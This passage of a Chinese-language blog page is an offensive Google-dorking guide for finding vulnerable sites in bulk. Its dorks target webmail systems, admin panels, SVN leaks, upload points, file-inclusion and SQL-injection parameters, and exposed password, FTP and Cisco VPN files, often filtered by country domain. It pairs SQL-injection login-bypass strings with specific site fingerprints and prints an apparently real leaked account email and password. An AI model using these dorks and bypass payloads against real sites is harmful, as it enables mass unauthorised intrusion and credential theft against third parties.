class="line">powered by phpcms <span class="number">2008</span>            powered by drupal <span class="number">7</span></div><div class="line">powered by dedecmsv57_gbk         powered by CubeCart <span class="number">3.0</span>.<span class="number">6</span></div><div class="line">Powered by phpBB <span class="number">2.0</span>.<span class="number">6</span>            powered by paBugs <span class="number">2.0</span> Beta <span class="number">3</span></div><div class="line"><span class="symbol">inurl:</span>wp-login.php                <span class="symbol">inurl:</span>/administrator/index.php    </div><div class="line"><span class="symbol">inurl:</span>/admina.php</div></pre></td></tr></table></figure>
-<h5 id="批量搜集目标是否用了一些存在漏洞的邮件程序-不一定有-多尝试-反正是搜集-找到东西价值越高越好"><a href="#批量搜集目标是否用了一些存在漏洞的邮件程序-不一定有-多尝试-反正是搜集-找到东西价值越高越好" class="headerlink" title="批量搜集目标是否用了一些存在漏洞的邮件程序[不一定有,多尝试,反正是搜集,找到东西价值越高越好]:"></a>批量搜集目标是否用了一些存在漏洞的邮件程序[不一定有,多尝试,反正是搜集,找到东西价值越高越好]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">owa:</span></div><div class="line"><span class="symbol">inurl:</span>/owa/auth/logon.aspx </div><div class="line"><span class="symbol">inurl:</span>/owa/auth/logon.aspx <span class="symbol">site:</span>*.org.*</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mirapoint(ShellShock):</div><div class="line"><span class="symbol">inurl:</span>/cgi-bin/search.cgi <span class="symbol">site:</span>*.org.*</div><div class="line"><span class="symbol">inurl:</span>/cgi-bin/madmin.cgi</div></pre></td></tr></table></figure>
-<p><img src="/img/google mirapoint.png" alt=""><br></p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Zimbra(本地包含):</div><div class="line"><span class="string">inurl:</span><span class="number">7071</span><span class="regexp">/zimbraAdmin/</span></div><div class="line"><span class="string">inurl:</span><span class="regexp">/help/</span>en_US<span class="regexp">/standard/</span>version.htm</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Atmail(用于连接数据库的配置文件泄露):</div><div class="line"></div><div class="line">TurboMail(配置错误,进入任意邮箱):</div><div class="line"></div><div class="line">U-mail(注入&amp;getshell):</div><div class="line"></div><div class="line">Lotus Domino Webmail(越权访问)<span class="symbol">:</span></div></pre></td></tr></table></figure>
-<h5 id="批量找常规网站后台-下面的php也可以换成asp-aspx-jsp-多次尝试-因为每个国家对后台的命名习惯各有特色-所以-这里只列举了一些相对命中率比较高的-找到后台以后-记得习惯性多尝试几个弱口令-万能密码未授权之类的东西"><a href="#批量找常规网站后台-下面的php也可以换成asp-aspx-jsp-多次尝试-因为每个国家对后台的命名习惯各有特色-所以-这里只列举了一些相对命中率比较高的-找到后台以后-记得习惯性多尝试几个弱口令-万能密码未授权之类的东西" class="headerlink" title="批量找常规网站后台[下面的php也可以换成asp,aspx,jsp 多次尝试,因为每个国家对后台的命名习惯各有特色,所以,这里只列举了一些相对命中率比较高的,找到后台以后,记得习惯性多尝试几个弱口令,万能密码未授权之类的东西]:"></a>批量找常规网站后台[下面的php也可以换成asp,aspx,jsp 多次尝试,因为每个国家对后台的命名习惯各有特色,所以,这里只列举了一些相对命中率比较高的,找到后台以后,记得习惯性多尝试几个弱口令,万能密码未授权之类的东西]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/manager/login.php <span class="symbol">site:</span>*.jp</div><div class="line"><span class="symbol">inurl:</span>/cms/login.php <span class="symbol">site:</span>*.jp</div><div class="line"><span class="symbol">inurl:</span>/manage/index.php <span class="symbol">site:</span>*.jp</div><div class="line"><span class="symbol">inurl:</span>/system/login.php <span class="symbol">site:</span>*.jp</div><div class="line"><span class="symbol">inurl:</span>/webadmin/login.php <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>admin_login.php <span class="symbol">intitle:</span>admin login</div><div class="line"><span class="symbol">inurl:</span>admin_login.php <span class="symbol">intitle:</span>admin page</div><div class="line"><span class="symbol">inurl:</span>/admin/login.php <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/admin/index.php <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/system/adminlogin.asp  <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/manage/login.aspx  <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/sysadm/index.php  <span class="symbol">site:</span>*.com</div><div class="line">……</div></pre></td></tr></table></figure>
-<p><img src="/img/google manager.png" alt=""><br></p>
-<h5 id="找svn泄露-运气好说不定能碰到密码"><a href="#找svn泄露-运气好说不定能碰到密码" class="headerlink" title="找svn泄露[运气好说不定能碰到密码]:"></a>找svn泄露[运气好说不定能碰到密码]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/.svn/entries </div><div class="line"><span class="symbol">inurl:</span>/.svn/entries <span class="symbol">site:</span>*.org.*</div><div class="line"><span class="symbol">inurl:</span>/.svn/entries <span class="symbol">site:</span>*.gov.br</div><div class="line"><span class="symbol">inurl:</span>/.svn/entries <span class="symbol">site:</span>*.hk</div></pre></td></tr></table></figure>
-<p><img src="/img/google svn.png" alt=""><br></p>
-<h5 id="批量找目标的后台未授权访问"><a href="#批量找目标的后台未授权访问" class="headerlink" title="批量找目标的后台未授权访问:"></a>批量找目标的后台未授权访问:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"Website Design &amp; Developed By : WebSay"</span>  默认后台/admin</div><div class="line"><span class="symbol">intext:</span><span class="string">"Powered by ENS Consultants"</span>  默认后台/admin/login.php</div><div class="line"><span class="symbol">intext:</span><span class="string">"Desenvolvimento - MW Way"</span>    默认后台/admin/index.php</div><div class="line"><span class="symbol">inurl:</span>.php?id= <span class="symbol">intext:</span><span class="string">"Web realizada por Soma Estudio"</span> </div><div class="line"><span class="symbol">inurl:</span>/_mycps/login.php</div></pre></td></tr></table></figure>
-<h5 id="批量找弱口令"><a href="#批量找弱口令" class="headerlink" title="批量找弱口令:"></a>批量找弱口令:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"design by weli"</span>   默认后台: <span class="regexp">/adm/login</span>.php 除了弱口令还有注入</div><div class="line">username : linjizen@gmail.com</div><div class="line">password : lin719192</div></pre></td></tr></table></figure>
-<h5 id="尽可能多的找到能够利用的各种上传点-比如-各种典型的漏洞编辑器地址-ck-kindeditor-fck-ewebeditor……"><a href="#尽可能多的找到能够利用的各种上传点-比如-各种典型的漏洞编辑器地址-ck-kindeditor-fck-ewebeditor……" class="headerlink" title="尽可能多的找到能够利用的各种上传点[比如:各种典型的漏洞编辑器地址,ck,kindeditor,fck,ewebeditor……]:"></a>尽可能多的找到能够利用的各种上传点[比如:各种典型的漏洞编辑器地址,ck,kindeditor,fck,ewebeditor……]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">" Powered by JADBM "</span>   JADBM Cms upload shell 注册后登陆上传即可</div><div class="line"><span class="symbol">inurl:</span><span class="string">"/index.php/frontend/login/en"</span>  Estate cms upload shell 注册后登陆上传即可</div><div class="line"><span class="symbol">inurl:</span>/Content/Roxy_Fileman/   该路径下直接就是上传点</div><div class="line">index <span class="symbol">of:</span><span class="string">"filemanager/dialog.php"</span>  该脚本就是上传脚本直接上传即可</div><div class="line"><span class="symbol">intext:</span><span class="string">"Desenvolvido por Webnet Soluções Tecnológicas."</span> fck上传</div><div class="line"><span class="symbol">inurl:</span><span class="string">"subir_foto.php"</span> 上传点</div><div class="line"><span class="symbol">inrul:</span><span class="string">"/imce?dir="</span> <span class="symbol">intitle:</span><span class="string">"File Browser"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">"Powered by Vision Helpdesk 3.9.10 Stable"</span> 注册后登陆进去编辑个人配置上传</div><div class="line">index of /admin/fckeditor <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/ewebeditor/  <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/admin/upload_file.php</div><div class="line"><span class="symbol">inurl:</span>/admin/upfile.php </div><div class="line"><span class="symbol">inurl:</span>/admin/upload.asp</div></pre></td></tr></table></figure>
-<h5 id="找到可能存在包含和命令执行类的漏洞的一些典型参数"><a href="#找到可能存在包含和命令执行类的漏洞的一些典型参数" class="headerlink" title="找到可能存在包含和命令执行类的漏洞的一些典型参数:"></a>找到可能存在包含和命令执行类的漏洞的一些典型参数:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>footer.inc.php?settings=</div><div class="line"><span class="symbol">inurl:</span>/pb_inc/admincenter/index.php?page=</div><div class="line"><span class="symbol">inurl:</span>/pnadmin/categories.inc.php?subpage=</div><div class="line"><span class="symbol">inurl:</span>/index.php??view=src/sistema/vistas/</div><div class="line"><span class="symbol">inurl:</span>/edit.php?em=file&amp;filename=</div><div class="line"><span class="symbol">inurl:</span>/path_to_athena/athena.php?athena_dir= 远程包含</div><div class="line"><span class="symbol">inurl:</span>/path_to_qnews/q-news.php?id=  远程包含</div><div class="line"><span class="symbol">inurl:</span>/inc/backend_settings.php?cmd=</div><div class="line"><span class="symbol">inurl:</span>login.action strus2系列执行漏洞利用</div><div class="line"><span class="symbol">inurl:</span>php?x=                 <span class="symbol">inurl:</span>php?open=</div><div class="line"><span class="symbol">inurl:</span>php?visualizar=        <span class="symbol">inurl:</span>php?pagina=</div><div class="line"><span class="symbol">inurl:</span>php?inc=               <span class="symbol">inurl:</span>php?include_file=</div><div class="line"><span class="symbol">inurl:</span>php?page=              <span class="symbol">inurl:</span>php?pg=</div><div class="line"><span class="symbol">inurl:</span>php?show=              <span class="symbol">inurl:</span>php?cat=</div><div class="line"><span class="symbol">inurl:</span>php?file=              <span class="symbol">inurl:</span>php?path_local=</div><div class="line"><span class="symbol">inurl:</span>php?filnavn=           <span class="symbol">inurl:</span>php?HCL_path=</div><div class="line"><span class="symbol">inurl:</span>php?doc=               <span class="symbol">inurl:</span>php?appdir=</div><div class="line"><span class="symbol">inurl:</span>php?phpbb_root_dir=    <span class="symbol">inurl:</span>php?phpc_root_path=</div><div class="line"><span class="symbol">inurl:</span>php?path_pre=          <span class="symbol">inurl:</span>php?nic=</div><div class="line"><span class="symbol">inurl:</span>php?sec=               <span class="symbol">inurl:</span>php?content=</div><div class="line"><span class="symbol">inurl:</span>php?link=              <span class="symbol">inurl:</span>php?filename=</div><div class="line"><span class="symbol">inurl:</span>php?dir=               <span class="symbol">inurl:</span>php?document=</div><div class="line"><span class="symbol">inurl:</span>index.php?view=        <span class="symbol">inurl:</span>*.php?locate=</div><div class="line"><span class="symbol">inurl:</span>*.php?place=           <span class="symbol">inurl:</span>*.php?layout=</div><div class="line"><span class="symbol">inurl:</span>*.php?go=              <span class="symbol">inurl:</span>*.php?catch=</div><div class="line"><span class="symbol">inurl:</span>*.php?mode=            <span class="symbol">inurl:</span>*.php?name=</div><div class="line"><span class="symbol">inurl:</span>*.php?loc=             <span class="symbol">inurl:</span>*.php?f=</div><div class="line"><span class="symbol">inurl:</span>*.php?inf=             <span class="symbol">inurl:</span>*.php?pg=</div><div class="line"><span class="symbol">inurl:</span>*.php?load=            <span class="symbol">inurl:</span>*.php?naam=</div><div class="line"><span class="symbol">allinurl:</span>php?page=           <span class="symbol">allinurl:</span>php?file= </div><div class="line"><span class="symbol">inurl:</span>php?x=                 <span class="symbol">inurl:</span>admin.php?cal_dir=</div><div class="line"><span class="symbol">inurl:</span>php?<span class="keyword">include</span>=           <span class="symbol">inurl:</span>php?nav=</div><div class="line"><span class="symbol">inurl:</span>*.php?sel=             <span class="symbol">inurl:</span>php?p=</div><div class="line"><span class="symbol">inurl:</span>php?conf=              <span class="symbol">inurl:</span>php?prefix=</div><div class="line"><span class="symbol">inurl:</span>theme.php?THEME_DIR= </div><div class="line"><span class="symbol">inurl:</span>php?lvc_include_dir=  </div><div class="line"><span class="symbol">inurl:</span>php?basepath=          <span class="symbol">inurl:</span>php?pm_path=</div><div class="line"><span class="symbol">inurl:</span>php?user_inc=          <span class="symbol">inurl:</span>php?cutepath=</div><div class="line"><span class="symbol">inurl:</span>php?fil_config=        <span class="symbol">inurl:</span>php?libpach=</div><div class="line"><span class="symbol">inurl:</span>php?pivot_path=        <span class="symbol">inurl:</span>php?rep=</div><div class="line"><span class="symbol">inurl:</span>php?conteudo=          <span class="symbol">inurl:</span>php?root=</div><div class="line"><span class="symbol">inurl:</span>php?configFile         <span class="symbol">inurl:</span>php?pageurl</div><div class="line"><span class="symbol">inurl:</span>php?inter_url          <span class="symbol">inurl:</span>php?url=</div><div class="line"><span class="symbol">inurl:</span>php?cmd=               <span class="symbol">inurl:</span>path.php?my=</div><div class="line"><span class="symbol">inurl:</span>php?xlink=             <span class="symbol">inurl:</span>php?to=</div><div class="line"><span class="symbol">inurl:</span>file.php?disp=</div></pre></td></tr></table></figure>
-<h5 id="找可能存在数据库注入各种参数"><a href="#找可能存在数据库注入各种参数" class="headerlink" title="找可能存在数据库注入各种参数:"></a>找可能存在数据库注入各种参数:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>categorysearch.php?indus=</div><div class="line"><span class="symbol">intext:</span><span class="string">"樂天台東民宿網"</span> <span class="symbol">inurl:</span>news_board.php</div></pre></td></tr></table></figure>
-<h5 id="小商城类"><a href="#小商城类" class="headerlink" title="小商城类:"></a>小商城类:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"View cart"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"Buy Now"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"add to cart"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"shopping"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"boutique"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"/store/"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"/shop/"</span></div><div class="line"><span class="symbol">inurl:</span><span class="string">".php?catid="</span> <span class="symbol">intext:</span><span class="string">"Toys"</span></div><div class="line"><span class="symbol">inurl:</span>details.php?BookID=</div><div class="line"><span class="symbol">inurl:</span>shop.php?<span class="keyword">do</span>=part&amp;id=</div></pre></td></tr></table></figure>
-<h5 id="普通cms类"><a href="#普通cms类" class="headerlink" title="普通cms类:"></a>普通cms类:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>article.php?ID=        <span class="symbol">inurl:</span>newsDetail.php?id=</div><div class="line"><span class="symbol">inurl:</span>show.php?id=           <span class="symbol">inurl:</span>newsone.php?id=</div><div class="line"><span class="symbol">inurl:</span>news.php?id=           <span class="symbol">inurl:</span>event.php?id=</div><div class="line"><span class="symbol">inurl:</span>preview.php?id=        <span class="symbol">inurl:</span>pages.php?id=</div><div class="line"><span class="symbol">inurl:</span>main.php?id=           <span class="symbol">inurl:</span>prod_detail.php?id=</div><div class="line"><span class="symbol">inurl:</span>view.php?id=           <span class="symbol">inurl:</span>product.php?id=</div><div class="line"><span class="symbol">inurl:</span>contact.php?Id=        <span class="symbol">inurl:</span>display_item.php?id=</div><div class="line"><span class="symbol">inurl:</span>item.php?id=           <span class="symbol">inurl:</span>view_items.php?id=</div><div class="line"><span class="symbol">inurl:</span>details.asp?id=        <span class="symbol">inurl:</span>profile.asp?id=</div><div class="line"><span class="symbol">inurl:</span>content.asp?id=        <span class="symbol">inurl:</span>display_item.asp?id=</div><div class="line"><span class="symbol">inurl:</span>view_detail.asp?ID=    <span class="symbol">inurl:</span>section.php?id=</div><div class="line"><span class="symbol">inurl:</span>theme.php?id=          <span class="symbol">inurl:</span>produit.php?id=</div><div class="line"><span class="symbol">inurl:</span>chappies.php?id=       <span class="symbol">inurl:</span>readnews.php?id=</div><div class="line"><span class="symbol">inurl:</span>rub.php?idr=           <span class="symbol">inurl:</span>pop.php?id=</div><div class="line"><span class="symbol">inurl:</span>person.php?id=         <span class="symbol">inurl:</span>read.php?id=</div><div class="line"><span class="symbol">inurl:</span>reagir.php?num=        <span class="symbol">inurl:</span>staff_id=</div><div class="line"><span class="symbol">inurl:</span>gallery.php?id=        <span class="symbol">inurl:</span>humor.php?id=</div><div class="line"><span class="symbol">inurl:</span>spr.php?id=            <span class="symbol">inurl:</span>gery.php?id=</div><div class="line"><span class="symbol">inurl:</span>profile_view.php?id=</div><div class="line"><span class="symbol">inurl:</span>fellows.php?id=        <span class="symbol">inurl:</span>ray.php?id=</div><div class="line"><span class="symbol">inurl:</span>productinfo.php?id=</div><div class="line"><span class="symbol">inurl:</span>file.php?cont=         <span class="symbol">inurl:</span><span class="keyword">include</span>.php?chapter=</div><div class="line"><span class="symbol">inurl:</span>principal.php?param=</div><div class="line"><span class="symbol">inurl:</span>general.php?menue=     <span class="symbol">inurl:</span>php?pref=</div><div class="line"><span class="symbol">inurl:</span>nota.php?chapter=      <span class="symbol">inurl:</span>php?str=</div><div class="line"><span class="symbol">inurl:</span>php?corpo=             <span class="symbol">inurl:</span>press.php?*[*]*=</div></pre></td></tr></table></figure>
-<h5 id="除了上面这些常规找注入的方式-你不妨还可以像下面这样-直接在网页标题中搜SQL语句-说不定也会有收获哦-web万能的谷歌"><a href="#除了上面这些常规找注入的方式-你不妨还可以像下面这样-直接在网页标题中搜SQL语句-说不定也会有收获哦-web万能的谷歌" class="headerlink" title="除了上面这些常规找注入的方式,你不妨还可以像下面这样,直接在网页标题中搜SQL语句,说不定也会有收获哦,web万能的谷歌:"></a>除了上面这些常规找注入的方式,你不妨还可以像下面这样,直接在网页标题中搜SQL语句,说不定也会有收获哦,web万能的谷歌:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intitle:</span>注入常用的一些sql语句,比如<span class="symbol">:</span>常用的union,substr(),select等等……</div></pre></td></tr></table></figure>
-<h5 id="批量搜集万能密码-属于注入的一种"><a href="#批量搜集万能密码-属于注入的一种" class="headerlink" title="批量搜集万能密码(属于注入的一种):"></a>批量搜集万能密码(属于注入的一种):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span><span class="string">"wladmin/login.asp"</span>  </div><div class="line">Username : <span class="string">'='</span> <span class="string">'or'</span></div><div class="line">Password : <span class="string">'='</span> <span class="string">'or'</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span>POWERED BY Versatile Software Services       默认后台/alogin.aspx</div><div class="line">User ==&gt; <span class="string">'or'</span><span class="string">'='</span></div><div class="line">Pass ==&gt; <span class="string">'or'</span><span class="string">'='</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/media.php?hal=login</div><div class="line"><span class="symbol">Email:</span> <span class="string">'='</span><span class="string">'or'</span>@gmail.com</div><div class="line"><span class="symbol">Pass:</span> <span class="string">'='</span><span class="string">'or'</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"Powered by : Best Webmasterz."</span> 默认后台/admin</div><div class="line">User : <span class="string">'='</span> <span class="string">'OR'</span></div><div class="line">Pass : <span class="string">'='</span> <span class="string">'OR'</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"Web Design and Maintenance by Cloud 5 Solutions"</span> 默认后台/admin/login.php</div><div class="line">User : <span class="string">'='</span> <span class="string">'OR'</span></div><div class="line">Pass : <span class="string">'='</span> <span class="string">'OR'</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"网站设计：火龙科技"</span> 默认后台/maintain/login.php</div><div class="line">Username : <span class="string">'='</span> <span class="string">'or'</span></div><div class="line">Password : <span class="string">'='</span> <span class="string">'or'</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span><span class="string">"Powered by Moodyworld"</span> 默认后台/admin/</div><div class="line">Username : <span class="string">'='</span> <span class="string">'or'</span></div><div class="line">Password : <span class="string">'='</span> <span class="string">'or'</span></div></pre></td></tr></table></figure>
-<h5 id="找遗留的各种数据库报错-物理路径-数据库版本-服务器探针类文件等等……"><a href="#找遗留的各种数据库报错-物理路径-数据库版本-服务器探针类文件等等……" class="headerlink" title="找遗留的各种数据库报错,物理路径,数据库版本,服务器探针类文件等等……"></a>找遗留的各种数据库报错,物理路径,数据库版本,服务器探针类文件等等……</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">site:</span>*.tw  <span class="symbol">inurl:</span>/phpinfo.php</div><div class="line"><span class="symbol">filetype:</span>log <span class="string">"PHP Parse error"</span><span class="params">| "PHP Warning"</span></div><div class="line">site:*.tw  "id=" &amp; intext:"Warning: mysql_fetch_array()</div><div class="line">site:*.jp  "id=" &amp; intext:"Warning: getimagesize()</div><div class="line">site:*.br  "id=" &amp; intext:"Warning: array_merge()</div><div class="line">site:*.tw  "id=" &amp; intext:"Warning: mysql_fetch_assoc()</div><div class="line">site:*.tw  "id=" &amp; intext:"Warning: mysql_result()</div><div class="line">site:*.jp  "id=" &amp; intext:"Warning: pg_exec()</div><div class="line">site:*.tw  "id=" &amp; intext:"Warning: <span class="keyword">require</span>()</div><div class="line">inurl:/robots.txt site:*.*</div></pre></td></tr></table></figure>
-<p><img src="/img/google mysql error.png" alt=""><br></p>
-<h5 id="搜集各种账号密码-比如-数据库密码-ftp-vpn-htpasswd-telnet等等……"><a href="#搜集各种账号密码-比如-数据库密码-ftp-vpn-htpasswd-telnet等等……" class="headerlink" title="搜集各种账号密码,比如,数据库密码,ftp,vpn,htpasswd,telnet等等……:"></a>搜集各种账号密码,比如,数据库密码,ftp,vpn,htpasswd,telnet等等……:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">可能会遗留的密码文件:</div><div class="line"></div><div class="line"><span class="symbol">inurl:</span>passlist.txt</div><div class="line"><span class="symbol">inurl:</span>password.txt</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">重要配置文件泄露:</div><div class="line"></div><div class="line"><span class="symbol">inurl:</span>/application/configs/  配置文件名为/application/configs/application.ini</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">htpasswd:</span></div><div class="line"></div><div class="line">htpasswd.bak <span class="symbol">filetype:</span>htpasswd</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vpn(cisco)[捅内网,非常有用]:</div><div class="line"></div><div class="line"><span class="symbol">filetype:</span>pcf  <span class="string">"GroupPwd"</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">##### cisco在线密码解密网站:</span></div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/www.unix-ag.uni-kl.de/</span>~massar/bin/cisco-decode</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ftp 账号密码:</div><div class="line"></div><div class="line"><span class="string">"index of/"</span> <span class="string">"ws_ftp.ini"</span> <span class="string">"parent directory"</span></div><div class="line"><span class="string">"your password is"</span> <span class="symbol">filetype:</span>log</div><div class="line"><span class="symbol">filetype:</span>ini <span class="symbol">inurl:</span><span class="string">"serv-u.ini"</span></div><div class="line"><span class="symbol">filetype:</span>ini <span class="symbol">inurl:</span>flashFXP.ini</div><div class="line"><span class="symbol">filetype:</span>ini ServUDaemon</div><div class="line"><span class="symbol">filetype:</span>ini wcx_ftp</div><div class="line"><span class="symbol">filetype:</span>ini ws_ftp pwd</div><div class="line"><span class="symbol">ext:</span>inc <span class="string">"pwd="</span> <span class="string">"UID="</span></div><div class="line">auth_user_file.txt</div></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">例如:</div><div class="line"></div><div class="line">http://www.cryptoman.com/ftp/</div><div class="line">http://www.cryptoman.com/ftp/WS_FTP.ini</div></pre></td></tr></table></figure>
-<h5 id="其他密码"><a href="#其他密码" class="headerlink" title="其他密码:"></a>其他密码:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin account info<span class="string">" filetype:log</span></div></pre></td></tr></table></figure>
